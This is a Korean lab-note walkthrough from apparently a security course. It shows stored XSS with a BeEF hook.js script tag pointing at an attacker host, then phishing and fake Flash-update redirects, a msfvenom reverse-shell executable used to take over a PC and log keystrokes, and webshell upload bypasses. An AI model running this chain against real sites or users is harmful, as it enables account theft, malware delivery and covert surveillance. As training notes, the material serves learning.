xss 취약점

1. 다른 사용자의 쿠키 정보 획득 -> 관리자 권한
2.  악성코드 배포(js파일로 접속) -> exe 파일 이후에 설치
3. 피싱사이트 유도

beef 실행

![image-20200907091313869](secure_day6.assets/image-20200907091313869.png)

![image-20200907092044229](secure_day6.assets/image-20200907092044229.png)

아래 주소 파폭으로 접속, 아이디 비번은 beef

![image-20200907091906081](secure_day6.assets/image-20200907091906081.png)

로컬에서 윗주소 http://192.168.20.128:3000/hook.js 접속

![image-20200907092453389](secure_day6.assets/image-20200907092453389.png)

<script src=http://192.168.20.128:3000/hook.js></script>

다음과 같이 http://test.nanum.info:82/board_edit.asp에 글 작성

![image-20200907093016115](secure_day6.assets/image-20200907093016115.png)

작성글에 접속하고 kali 확인하면

![image-20200907094209242](secure_day6.assets/image-20200907094209242.png)

다음과 같이 test라고 공격하면

![image-20200907095016733](secure_day6.assets/image-20200907095016733.png)

공격당함 ㄷㄷ, 하지만 이 공격은 실무에서 사용하기에는 어렵다. 공격하는동안 페이지에 머물러야하기 때문이다.

![image-20200907095032040](secure_day6.assets/image-20200907095032040.png)

페이지 바꿔서 악성코드 있는 페이지로 유도 가능

![image-20200907101619853](secure_day6.assets/image-20200907101619853.png)

페이지 이동시킴

![image-20200907101631232](secure_day6.assets/image-20200907101631232.png)

구글 피싱

![image-20200907102332239](secure_day6.assets/image-20200907102332239.png)

ddd

![image-20200907102352465](secure_day6.assets/image-20200907102352465.png)

피싱성공

![image-20200907102452742](secure_day6.assets/image-20200907102452742.png)



페이크 플래시, 아무튼 뭐 이런게 있음 공격하면 파일 다운받게 함

![image-20200907102644825](secure_day6.assets/image-20200907102644825.png)

---

새탭에서 작업

![image-20200907103107324](secure_day6.assets/image-20200907103107324.png)

![image-20200907103214196](secure_day6.assets/image-20200907103214196.png)

둘이 떨어질 수 없음

![image-20200907103500916](secure_day6.assets/image-20200907103500916.png)

kali, payload - 연결점, 공격코드 등으로 불림

![image-20200907104110992](secure_day6.assets/image-20200907104110992.png)

<br/>

### msavenom

msfpayload + msfencoder 인놈

새탭에서 작업

![image-20200907105122204](secure_day6.assets/image-20200907105122204.png)

생성된

![image-20200907105226463](secure_day6.assets/image-20200907105226463.png)

시나리오

1. msfvenom을 이용해서 7777포트로 악성코드 생성
2. 7777포트를 기다리는 핸들러 생성 및 대기상태
3. 생성한 security.exe 파일을 외부에 공개(웹서비스 이용)
4. beef 배포 url에 3번의 공개 url로 수정
5. 플래쉬 업데이트 피싱 사이트 실행

현재 대기중인 상태

![image-20200907105544765](secure_day6.assets/image-20200907105544765.png)

securyty.exe 존재하는 디렉토리에서 서버실행

![image-20200907105835158](secure_day6.assets/image-20200907105835158.png)

![image-20200907110040182](secure_day6.assets/image-20200907110040182.png)

다시 플래시 공격 하면 exe 악성코드 배포되게함, 근데 windows defender가 막네

![image-20200907112325899](secure_day6.assets/image-20200907112325899.png)

해제하고 실행하면 다음과 같이 뜨고, PC를 장악한것이다.

![image-20200907114401999](secure_day6.assets/image-20200907114401999.png)

shell 입력하면 cmd 접속 됨

![image-20200907114815126](secure_day6.assets/image-20200907114815126.png)

keyscan start

![image-20200907132226589](secure_day6.assets/image-20200907132226589.png)

이제 입력값을 가져올 수 있다, tghy / tghyhju 입력함

![image-20200907132250409](secure_day6.assets/image-20200907132250409.png)

keyscan_dump를 통해 그동안 입력한 값들을 가져올 수 있다.

![image-20200907132341838](secure_day6.assets/image-20200907132341838.png)

---

## 파일업로드 취약점

1. 
2. 업로드한 웹쉘의 위치 절대경로를 알아야함
3. 업로드 된 웹쉘 스크립트 실행

우회

1. 자바스크립트 우회

   -> 응답값에 제한 스크립트를 삭제

   -> 허용되는 확장자(jpg)로 올리는 과정에서 확장자를 바꿔서 업로드

   

-> 이후 공격(위에서 한대로)

0. 스크립트 삽입
1. msfvenom을 이용해서 7777포트로 악성코드 생성
2. 7777포트를 기다리는 핸들러 생성 및 대기상태
3. 생성한 security.exe 파일을 외부에 공개(웹서비스 이용)
4. beef 배포 url에 3번의 공개 url로 수정
5. 플래쉬 업데이트 피싱 사이트 실행



들어가서 비밀번호는 b374k

![image-20200907145644605](secure_day6.assets/image-20200907145644605.png)

비밀번호는 bug

![image-20200907145512392](secure_day6.assets/image-20200907145512392.png)

![image-20200907145615189](secure_day6.assets/image-20200907145615189.png)

---

## asp 파일 올리기

간단하다 버프스윗 이용하여 이것만 없애주면 된다.

![image-20200907154624461](secure_day6.assets/image-20200907154624461.png)

<br/>

그럼 js 건들지 않고 어떻게 할까? 확장자를 변경하고 올린 후

![image-20200907155002484](secure_day6.assets/image-20200907155002484.png)

이 부분을 asp로 바꿔준다. 중간에 바꿔버리는 것이다.

![image-20200907155048882](secure_day6.assets/image-20200907155048882.png)

php 파일이 서버사이드에서 막히면, 어떻게 할까? 나중에 물어보자

